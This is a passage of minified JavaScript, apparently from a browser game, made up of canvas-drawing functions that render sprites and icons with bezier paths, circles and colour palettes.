      n.bezierCurveTo(e * 3, e * 213, e * 2, e * 213, e * 4, e * 198);
      n.bezierCurveTo(e * 12.5, e * 193, e * 12.5, e * 193, e * 21, e * 188);
      n.closePath();
      ye(n, i[2], i[0], e * 12);
      ze(n, e * 41, e * 30, e * 14.7648230602334);
      ye(n, i[2], i[0], e * 12);
      ze(n, e * 369, e * 30, e * 15.556349186104045);
      ye(n, i[2], i[0], e * 12);
      ze(n, e * 364, e * 190, e * 15.620499351813308);
      ye(n, i[2], i[0], e * 12);
      ze(n, e * 41, e * 186, e * 15.556349186104045);
      ye(n, i[2], i[0], e * 12);
      return r;
    }
    function qt(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      n.width = e * 450;
      n.height = e * 260;
      var o = Jt(e * 1, true, t);
      a.drawImage(o, e * 0, e * 0);
      if (r == 1) {
        a.translate(e * 100, e * 0);
        ze(a, e * 113, e * 120, e * 66);
        ye(a, undefined, t[4], e * 13);
        o = Bi(e * 0.65, true, ["#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]);
        a.rotate(0.7);
        a.drawImage(o, e * 133, e * -64);
        a.rotate(-0.7);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 70, e * 70);
        a.bezierCurveTo(e * 113, e * 120.5, e * 113, e * 120.5, e * 156, e * 171);
        a.closePath();
        ye(a, undefined, t[4], e * 13);
      } else if (r == 2) {
        a.translate(e * 100, e * 0);
        ze(a, e * 113, e * 120, e * 66);
        ye(a, undefined, t[4], e * 13);
        a.translate(e * 30, e * 40);
        a.save();
        a.translate(e * 83.5, e * 66.5);
        Be(a, e * -40.5, e * -29.5, e * 81, e * 59, e * 15);
        a.restore();
        ye(a, "#dff2f7", "#187484", e * 7);
        ze(a, e * 22, e * 82, e * 12);
        ye(a, "#dff2f7", "#187484", e * 7);
        ze(a, e * 145, e * 82, e * 12);
        ye(a, "#dff2f7", "#187484", e * 7);
        o = tt(e * 0.5, true, ["#80500b", "#7c4908"]);
        a.drawImage(o, e * 10, e * 85);
        o = tt(e * 0.5, true, ["#80500b", "#7c4908"]);
        a.drawImage(o, e * 50, e * 85);
        o = tt(e * 0.5, true, ["#80500b", "#7c4908"]);
        a.drawImage(o, e * 90, e * 85);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 90, e * 105);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 90, e * 105);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 30, e * 125);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 50, e * 115);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 30, e * 100);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 80, e * 120);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 110, e * 125);
        o = rt(e * 1, 0, ["#3d2a6e", "#8255b5"]);
        a.drawImage(o, e * 120, e * 105);
      } else if (r == 3) {
        a.translate(e * 100, e * 0);
        ze(a, e * 113, e * 120, e * 66);
        ye(a, undefined, t[4], e * 13);
        a.translate(e * 40, e * 50);
        a.save();
        a.translate(e * 71, e * 69);
        Be(a, e * -30, e * -42, e * 60, e * 84, e * 10);
        a.restore();
        ye(a, undefined, t[5], e * 4);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 42, e * 28);
        a.bezierCurveTo(e * 60, e * 31, e * 60, e * 31, e * 78, e * 34);
        a.bezierCurveTo(e * 82, e * 34, e * 84, e * 37, e * 83, e * 45);
        a.bezierCurveTo(e * 83, e * 80, e * 83, e * 80, e * 83, e * 115);
        a.bezierCurveTo(e * 83, e * 120, e * 80, e * 122, e * 73, e * 120);
        a.bezierCurveTo(e * 42, e * 111, e * 43, e * 109, e * 41, e * 102);
        a.bezierCurveTo(e * 41, e * 71, e * 41, e * 71, e * 41, e * 40);
        a.closePath();
        ye(a, t[5], t[5], e * 4);
        a.translate(e * -40, e * -50);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 70, e * 70);
        a.bezierCurveTo(e * 113, e * 120.5, e * 113, e * 120.5, e * 156, e * 171);
        a.closePath();
        ye(a, undefined, t[4], e * 13);
      } else if (r == 4) {
        a.scale(1, 1);
        a.translate(e * 70, e * 50);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 23, e * 6);
        a.bezierCurveTo(e * 25.5, e * 56, e * 25.5, e * 56, e * 28, e * 106);
        ye(a, undefined, t[5], e * 14);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 59, e * 10);
        a.bezierCurveTo(e * 61, e * 51.5, e * 61, e * 51.5, e * 63, e * 93);
        ye(a, undefined, t[5], e * 14);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 7, e * 55);
        a.bezierCurveTo(e * 33.5, e * 55, e * 33.5, e * 55, e * 60, e * 55);
        ye(a, undefined, t[5], e * 14);
        a.translate(e * 10, e * 0);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 123, e * 16);
        a.bezierCurveTo(e * 103, e * 16.5, e * 103, e * 16.5, e * 83, e * 17);
        a.bezierCurveTo(e * 83.5, e * 61, e * 83.5, e * 61, e * 84, e * 105);
        a.bezierCurveTo(e * 106, e * 105, e * 106, e * 105, e * 128, e * 105);
        ye(a, undefined, t[5], e * 14);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 72, e * 63);
        a.bezierCurveTo(e * 88.5, e * 62.5, e * 88.5, e * 62.5, e * 105, e * 62);
        ye(a, undefined, t[5], e * 14);
        a.translate(e * 10, e * 10);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 141, e * 8);
        a.bezierCurveTo(e * 143, e * 50, e * 143, e * 50, e * 145, e * 92);
        a.bezierCurveTo(e * 169, e * 88.5, e * 169, e * 88.5, e * 193, e * 85);
        ye(a, undefined, t[5], e * 14);
        a.translate(e * 10, e * -10);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 205, e * 124);
        a.bezierCurveTo(e * 205, e * 69, e * 205, e * 69, e * 205, e * 14);
        a.bezierCurveTo(e * 239, e * 15, e * 250, e * 37, e * 249, e * 49);
        a.bezierCurveTo(e * 251, e * 65, e * 242, e * 76, e * 206, e * 75);
        ye(a, undefined, t[5], e * 14);
      }
      return n;
    }
    function jt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 345;
      r.height = e * 250;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105, e * 58);
      n.bezierCurveTo(e * 100.5, e * 43, e * 100.5, e * 43, e * 96, e * 28);
      n.bezierCurveTo(e * 119.5, e * 33.5, e * 119.5, e * 33.5, e * 143, e * 39);
      n.bezierCurveTo(e * 170, e * 37, e * 177, e * 37, e * 188, e * 40);
      n.bezierCurveTo(e * 213, e * 33.5, e * 213, e * 33.5, e * 238, e * 27);
      n.bezierCurveTo(e * 231, e * 52, e * 234, e * 42.5, e * 230, e * 58);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 108, e * 51);
      n.bezierCurveTo(e * 91, e * 55, e * 85, e * 44, e * 86, e * 29);
      n.bezierCurveTo(e * 62, e * 50, e * 78, e * 69, e * 92, e * 75);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 249, e * 27);
      n.bezierCurveTo(e * 273, e * 49, e * 262, e * 68, e * 246, e * 77);
      n.bezierCurveTo(e * 231, e * 59, e * 236, e * 66.5, e * 226, e * 56);
      n.bezierCurveTo(e * 243, e * 53, e * 252, e * 43, e * 249, e * 28);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87, e * 78);
      n.bezierCurveTo(e * 87, e * 59, e * 98, e * 46, e * 127, e * 48);
      n.bezierCurveTo(e * 176, e * 48.5, e * 176, e * 48.5, e * 225, e * 49);
      n.bezierCurveTo(e * 243, e * 49, e * 253, e * 59, e * 253, e * 76);
      n.bezierCurveTo(e * 211, e * 85.5, e * 211, e * 85.5, e * 169, e * 95);
      n.closePath();
      ye(n, t[5], t[6], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56, e * 105);
      n.bezierCurveTo(e * 56, e * 92, e * 59, e * 86, e * 65, e * 73);
      n.bezierCurveTo(e * 62.5, e * 61.5, e * 62.5, e * 61.5, e * 60, e * 50);
      n.bezierCurveTo(e * 99.5, e * 64.5, e * 99.5, e * 64.5, e * 139, e * 79);
      n.bezierCurveTo(e * 164, e * 77, e * 177, e * 76, e * 203, e * 78);
      n.bezierCurveTo(e * 242, e * 63.5, e * 242, e * 63.5, e * 281, e * 49);
      n.bezierCurveTo(e * 279, e * 60.5, e * 279, e * 60.5, e * 277, e * 72);
      n.bezierCurveTo(e * 286, e * 88, e * 286, e * 96, e * 287, e * 104);
      n.bezierCurveTo(e * 228.5, e * 127, e * 228.5, e * 127, e * 170, e * 150);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 48, e * 130);
      n.bezierCurveTo(e * 61, e * 155, e * 63, e * 165, e * 56, e * 171);
      n.bezierCurveTo(e * 48, e * 177, e * 40, e * 171, e * 38, e * 178);
      n.bezierCurveTo(e * 33, e * 180, e * 37, e * 188, e * 47, e * 208);
      n.bezierCurveTo(e * 52, e * 221, e * 55, e * 222, e * 75, e * 229);
      n.bezierCurveTo(e * 91, e * 213, e * 98, e * 212, e * 112, e * 219);
      n.bezierCurveTo(e * 167, e * 225, e * 187, e * 224, e * 222, e * 220);
      n.bezierCurveTo(e * 244, e * 214, e * 247, e * 213, e * 263, e * 229);
      n.bezierCurveTo(e * 295, e * 220, e * 291, e * 215, e * 301, e * 194);
      n.bezierCurveTo(e * 308, e * 178, e * 309, e * 176, e * 302, e * 173);
      n.bezierCurveTo(e * 290, e * 177, e * 289, e * 177, e * 283, e * 169);
      n.bezierCurveTo(e * 279, e * 163, e * 279, e * 161, e * 290, e * 130);
      n.bezierCurveTo(e * 270, e * 127, e * 270, e * 127, e * 250, e * 124);
      n.bezierCurveTo(e * 209, e * 137.5, e * 209, e * 137.5, e * 168, e * 151);
      n.bezierCurveTo(e * 121, e * 135, e * 121, e * 135, e * 74, e * 119);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      n.globalCompositeOperation = "destination-out";
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 133, e * 158);
      n.bezierCurveTo(e * 152, e * 193, e * 158, e * 205, e * 140, e * 203);
      n.bezierCurveTo(e * 99, e * 195, e * 96, e * 189, e * 86, e * 173);
      n.bezierCurveTo(e * 80, e * 159, e * 88, e * 145, e * 104, e * 141);
      n.closePath();
      ye(n, t[7], t[8], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 215, e * 146);
      n.bezierCurveTo(e * 204, e * 167, e * 204, e * 167, e * 193, e * 188);
      n.bezierCurveTo(e * 187, e * 201, e * 191, e * 209, e * 213, e * 201);
      n.bezierCurveTo(e * 247, e * 192, e * 253, e * 181, e * 257, e * 169);
      n.bezierCurveTo(e * 260, e * 157, e * 254, e * 149, e * 243, e * 141);
      n.closePath();
      ye(n, t[7], t[8], e * 8);
      n.globalCompositeOperation = "source-over";
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 133, e * 158);
      n.bezierCurveTo(e * 152, e * 193, e * 158, e * 205, e * 140, e * 203);
      n.bezierCurveTo(e * 99, e * 195, e * 96, e * 189, e * 86, e * 173);
      n.bezierCurveTo(e * 80, e * 159, e * 88, e * 145, e * 104, e * 141);
      n.closePath();
      ye(n, undefined, t[8], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 215, e * 146);
      n.bezierCurveTo(e * 204, e * 167, e * 204, e * 167, e * 193, e * 188);
      n.bezierCurveTo(e * 187, e * 201, e * 191, e * 209, e * 213, e * 201);
      n.bezierCurveTo(e * 247, e * 192, e * 253, e * 181, e * 257, e * 169);
      n.bezierCurveTo(e * 260, e * 157, e * 254, e * 149, e * 243, e * 141);
      n.closePath();
      ye(n, undefined, t[8], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39, e * 66);
      n.bezierCurveTo(e * 57, e * 107, e * 63, e * 96, e * 120, e * 106);
      n.bezierCurveTo(e * 154, e * 112, e * 163, e * 116, e * 174, e * 135);
      n.bezierCurveTo(e * 180, e * 109, e * 191, e * 113, e * 237, e * 103);
      n.bezierCurveTo(e * 276, e * 100, e * 289, e * 94, e * 301, e * 67);
      n.bezierCurveTo(e * 317, e * 112, e * 301, e * 141, e * 274, e * 139);
      n.bezierCurveTo(e * 204, e * 166, e * 197, e * 169, e * 173, e * 183);
      n.bezierCurveTo(e * 170, e * 183, e * 170, e * 183, e * 167, e * 183);
      n.bezierCurveTo(e * 132, e * 160, e * 112, e * 156, e * 73, e * 141);
      n.bezierCurveTo(e * 43, e * 146, e * 27, e * 120, e * 39, e * 66);
      n.closePath();
      ye(n, t[7], t[8], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 185);
      n.bezierCurveTo(e * 115, e * 200, e * 118, e * 206, e * 124, e * 212);
      n.bezierCurveTo(e * 133, e * 223, e * 132, e * 231, e * 121, e * 230);
      n.bezierCurveTo(e * 108, e * 226, e * 108, e * 215, e * 107, e * 209);
      n.bezierCurveTo(e * 106, e * 201, e * 110, e * 196, e * 114, e * 185);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 226, e * 186);
      n.bezierCurveTo(e * 234, e * 201, e * 238, e * 209, e * 228, e * 225);
      n.bezierCurveTo(e * 223, e * 233, e * 213, e * 233, e * 211, e * 226);
      n.bezierCurveTo(e * 206, e * 219, e * 217, e * 216, e * 221, e * 207);
      n.bezierCurveTo(e * 225, e * 196, e * 225, e * 191, e * 226, e * 186);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 172, e * 110);
      n.bezierCurveTo(e * 189, e * 153, e * 192, e * 160, e * 188, e * 175);
      n.bezierCurveTo(e * 183, e * 190, e * 176, e * 197, e * 165, e * 191);
      n.bezierCurveTo(e * 153, e * 181, e * 152, e * 166, e * 157, e * 151);
      n.bezierCurveTo(e * 164.5, e * 131, e * 164.5, e * 131, e * 172, e * 111);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      return r;
    }
    function Zt(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 149;
      t.height = e * 153;
      r.globalAlpha = 0.5;
      ze(r, e * 74.5, e * 85, e * 66);
      ye(r, i[0]);
      r.globalAlpha = 1;
      ze(r, e * 75.5, e * 72.5, e * 67);
      ye(r, i[1], i[2], e * 4);
      ze(r, e * 75.5, e * 73.5, e * 54);
      ye(r, i[3]);
      r.globalAlpha = 0.5;
      ze(r, e * 74.5, e * 80.5, e * 39);
      ye(r, i[4]);
      r.globalAlpha = 1;
      ze(r, e * 74.5, e * 74.5, e * 37);
      ye(r, i[5]);
      return t;
    }
    function Qt(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 173;
      t.height = e * 178;
      r.globalAlpha = 0.5;
      ze(r, e * 86.5, e * 98, e * 80);
      ye(r, i[0]);
      r.globalAlpha = 1;
      ze(r, e * 86.5, e * 89, e * 81);
      ye(r, i[1], i[2], e * 4);
      ze(r, e * 86.5, e * 86, e * 59);
      ye(r, i[3], i[4], e * 4);
      r.globalAlpha = 0.5;
      ze(r, e * 86.5, e * 95, e * 34);
      ye(r, i[0]);
      r.globalAlpha = 1;
      ze(r, e * 86.5, e * 89, e * 34);
      ye(r, i[5]);
      return t;
    }
    function $t(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 253;
      t.height = e * 260;
      r.globalAlpha = 0.5;
      ze(r, e * 126.5, e * 134, e * 119);
      ye(r, i[0]);
      r.globalAlpha = 1;
      ze(r, e * 126.5, e * 124, e * 119);
      ye(r, i[1], i[2], e * 4);
      ze(r, e * 126.5, e * 127, e * 100);
      ye(r, i[3]);
      r.globalAlpha = 0.5;
      ze(r, e * 126.5, e * 135, e * 81);
      ye(r, i[0]);
      r.globalAlpha = 1;
      ze(r, e * 126.5, e * 125, e * 84);
      ye(r, i[4], i[5], e * 4);
      ze(r, e * 126.5, e * 125, e * 61);
      ye(r, i[6], i[7], e * 4);
      r.globalAlpha = 0.5;
      ze(r, e * 126.5, e * 134, e * 40);
      ye(r, i[8]);
      r.globalAlpha = 1;
      ze(r, e * 126.5, e * 125, e * 40);
      ye(r, i[9]);
      return t;
    }
    function er(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 139;
      r.height = e * 135;
      n.translate(0, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 32, e * 77);
      n.bezierCurveTo(e * 6, e * 41, e * 6, e * 33, e * 12, e * 27);
      n.bezierCurveTo(e * 27, e * 6, e * 28, e * 6, e * 37, e * 6);
      n.bezierCurveTo(e * 62, e * 3, e * 64, e * 5, e * 67, e * 13);
      n.bezierCurveTo(e * 80, e * 36, e * 73.5, e * 25, e * 80, e * 37);
      n.bezierCurveTo(e * 73.5, e * 54, e * 65, e * 74, e * 67, e * 71);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 65, e * 37);
      n.bezierCurveTo(e * 105, e * 40, e * 113, e * 39, e * 117, e * 48);
      n.bezierCurveTo(e * 126, e * 70, e * 128, e * 72, e * 124, e * 80);
      n.bezierCurveTo(e * 112, e * 101, e * 110, e * 104, e * 99, e * 104);
      n.bezierCurveTo(e * 59, e * 100, e * 55, e * 99, e * 56, e * 99);
      n.bezierCurveTo(e * 47.5, e * 79, e * 45, e * 66, e * 39, e * 59);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 63);
      n.bezierCurveTo(e * 5, e * 99, e * 5, e * 101, e * 8, e * 103);
      n.bezierCurveTo(e * 19, e * 123, e * 22, e * 125, e * 28, e * 126);
      n.bezierCurveTo(e * 57, e * 127, e * 55, e * 127, e * 58, e * 120);
      n.bezierCurveTo(e * 82, e * 86, e * 83, e * 78, e * 82, e * 87);
      n.closePath();
      ye(n, t[0]);
      n.translate(0, e * -10);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 32, e * 77);
      n.bezierCurveTo(e * 6, e * 41, e * 6, e * 33, e * 12, e * 27);
      n.bezierCurveTo(e * 27, e * 6, e * 28, e * 6, e * 37, e * 6);
      n.bezierCurveTo(e * 62, e * 3, e * 64, e * 5, e * 67, e * 13);
      n.bezierCurveTo(e * 80, e * 36, e * 73.5, e * 25, e * 80, e * 37);
      n.bezierCurveTo(e * 73.5, e * 54, e * 65, e * 74, e * 67, e * 71);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 65, e * 37);
      n.bezierCurveTo(e * 105, e * 40, e * 113, e * 39, e * 117, e * 48);
      n.bezierCurveTo(e * 126, e * 70, e * 128, e * 72, e * 124, e * 80);
      n.bezierCurveTo(e * 112, e * 101, e * 110, e * 104, e * 99, e * 104);
      n.bezierCurveTo(e * 59, e * 100, e * 55, e * 99, e * 56, e * 99);
      n.bezierCurveTo(e * 47.5, e * 79, e * 45, e * 66, e * 39, e * 59);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 63);
      n.bezierCurveTo(e * 5, e * 99, e * 5, e * 101, e * 8, e * 103);
      n.bezierCurveTo(e * 19, e * 123, e * 22, e * 125, e * 28, e * 126);
      n.bezierCurveTo(e * 57, e * 127, e * 55, e * 127, e * 58, e * 120);
      n.bezierCurveTo(e * 82, e * 86, e * 83, e * 78, e * 82, e * 87);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80, e * 38);
      n.bezierCurveTo(e * 72.5, e * 52, e * 72.5, e * 52, e * 65, e * 66);
      n.bezierCurveTo(e * 47.5, e * 37, e * 47.5, e * 37, e * 30, e * 7);
      n.bezierCurveTo(e * 48, e * 4, e * 57, e * 4, e * 64, e * 10);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 65, e * 65);
      n.bezierCurveTo(e * 125, e * 73, e * 95.5, e * 69, e * 126, e * 73);
      n.bezierCurveTo(e * 119, e * 98, e * 106, e * 104, e * 98, e * 103);
      n.bezierCurveTo(e * 84.5, e * 102, e * 84.5, e * 102, e * 71, e * 101);
      n.bezierCurveTo(e * 64, e * 86, e * 64, e * 86, e * 57, e * 70);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 27, e * 69);
      n.bezierCurveTo(e * 64, e * 65, e * 46, e * 67, e * 65, e * 65);
      n.bezierCurveTo(e * 43.5, e * 94, e * 43.5, e * 94, e * 22, e * 123);
      n.bezierCurveTo(e * 8, e * 103, e * 8, e * 103, e * 9, e * 103);
      n.bezierCurveTo(e * 5, e * 98, e * 11, e * 89, e * 26, e * 70);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 26, e * 69);
      n.bezierCurveTo(e * 65, e * 60, e * 45, e * 65, e * 64, e * 60);
      n.bezierCurveTo(e * 63, e * 65, e * 63, e * 65, e * 62, e * 70);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80, e * 38);
      n.bezierCurveTo(e * 68, e * 70, e * 75, e * 53, e * 70, e * 68);
      n.bezierCurveTo(e * 65, e * 67, e * 65, e * 67, e * 60, e * 65);
      n.closePath();
      ye(n, t[2]);
      return r;
    }
    function ir(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 100;
      t.height = e * 100;
      r.globalAlpha = 0.5;
      r.fillStyle = i[0];
      r.fillRect(0, 0, t.width, t.height);
      return t;
    }
    function tr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 120;
      t.height = e * 300;
      r.translate(e * -80, -20);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 200.5, e * 14.953125);
      r.bezierCurveTo(e * 203, e * 171.953125, e * 203, e * 171.953125, e * 205.5, e * 328.953125);
      r.bezierCurveTo(e * 188.5, e * 257.953125, e * 164.5, e * 216.953125, e * 166.5, e * 176.953125);
      r.bezierCurveTo(e * 168.5, e * 133.953125, e * 198.5, e * 98.953125, e * 200.5, e * 14.953125);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function rr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 120;
      t.height = e * 300;
      r.translate(e * -200, e * -40);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 344, e * 18.40625);
      r.bezierCurveTo(e * 345, e * 361.40625, e * 344, e * 191.40625, e * 344, e * 364.40625);
      r.bezierCurveTo(e * 261, e * 275.40625, e * 274, e * 259.40625, e * 229, e * 213.40625);
      r.bezierCurveTo(e * 199, e * 187.40625, e * 222, e * 133.40625, e * 273, e * 100.40625);
      r.bezierCurveTo(e * 321, e * 71.40625, e * 327, e * 34.40625, e * 344, e * 18.40625);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 335, e * 38.072906494140625);
      r.bezierCurveTo(e * 307, e * 62.072906494140625, e * 291, e * 60.072906494140625, e * 262, e * 68.07290649414062);
      r.bezierCurveTo(e * 223, e * 80.07290649414062, e * 225, e * 111.07290649414062, e * 264, e * 139.07290649414062);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function nr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 120;
      t.height = e * 320;
      r.translate(e * -60, e * -15);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 188.5, e * 3.953125);
      r.bezierCurveTo(e * 188.5, e * 171.453125, e * 188.5, e * 171.453125, e * 188.5, e * 338.953125);
      r.bezierCurveTo(e * 162.5, e * 268.953125, e * 145.5, e * 265.953125, e * 116.5, e * 244.953125);
      r.bezierCurveTo(e * 67.5, e * 204.953125, e * 87.5, e * 160.953125, e * 113.5, e * 125.953125);
      r.bezierCurveTo(e * 141.5, e * 90.953125, e * 176.5, e * 56.953125, e * 188.5, e * 3.953125);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function ar(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 120;
      t.height = e * 330;
      r.translate(e * -60, e * -10);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 188.5, e * 7.953125);
      r.bezierCurveTo(e * 188.5, e * 334.953125, e * 188.5, e * 332.953125, e * 188.5, e * 339.953125);
      r.bezierCurveTo(e * 166.5, e * 295.953125, e * 145.5, e * 295.953125, e * 139.5, e * 282.953125);
      r.bezierCurveTo(e * 124.5, e * 244.953125, e * 139.5, e * 243.953125, e * 131.5, e * 212.953125);
      r.bezierCurveTo(e * 118.5, e * 161.953125, e * 69.5, e * 156.953125, e * 74.5, e * 92.953125);
      r.bezierCurveTo(e * 85.5, e * 41.953125, e * 158.5, e * 49.953125, e * 188.5, e * 7.953125);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function or(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 48;
      t.height = e * 47;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 7.1875, e * 25.434661865234375);
      r.bezierCurveTo(e * 11.1875, e * 13.434661865234375, e * 18.1875, e * 8.434661865234375, e * 32.1875, e * 10.434661865234375);
      r.bezierCurveTo(e * 45.1875, e * 14.434661865234375, e * 41.1875, e * 24.434661865234375, e * 36.1875, e * 30.434661865234375);
      r.bezierCurveTo(e * 22.1875, e * 42.434661865234375, e * 2.1875, e * 41.434661865234375, e * 7.1875, e * 25.434661865234375);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function sr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 120;
      t.height = e * 280;
      r.translate(e * -100, e * -20);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 228.5, e * 331.953125);
      r.bezierCurveTo(e * 228.5, e * 12.953125, e * 228.5, e * 171.453125, e * 228.5, e * 10.953125);
      r.bezierCurveTo(e * 196.5, e * 76.953125, e * 206.5, e * 78.953125, e * 191.5, e * 114.953125);
      r.bezierCurveTo(e * 162.5, e * 170.953125, e * 206.5, e * 220.953125, e * 210.5, e * 251.953125);
      r.bezierCurveTo(e * 218.5, e * 287.953125, e * 220.5, e * 291.953125, e * 228.5, e * 331.953125);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function _r(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 33;
      t.height = e * 35;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 12.75, e * 7.1328125);
      r.bezierCurveTo(e * 26.75, e * 8.1328125, e * 27.75, e * 14.1328125, e * 24.75, e * 23.1328125);
      r.bezierCurveTo(e * 19.75, e * 31.1328125, e * 15.75, e * 33.1328125, e * 6.75, e * 26.1328125);
      r.bezierCurveTo(e * 0.75, e * 19.1328125, e * 4.75, e * 8.1328125, e * 12.75, e * 7.1328125);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function Er(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 20;
      t.height = e * 35;
      Be(r, 0, 0, 20, 35, 7);
      ye(r, i[0]);
      return t;
    }
    function Tr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 161;
      t.height = e * 190;
      r.globalAlpha = 0.5;
      r.translate(0, 8);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 9, e * 93);
      r.bezierCurveTo(e * 17, e * 95, e * 19, e * 95, e * 21, e * 95);
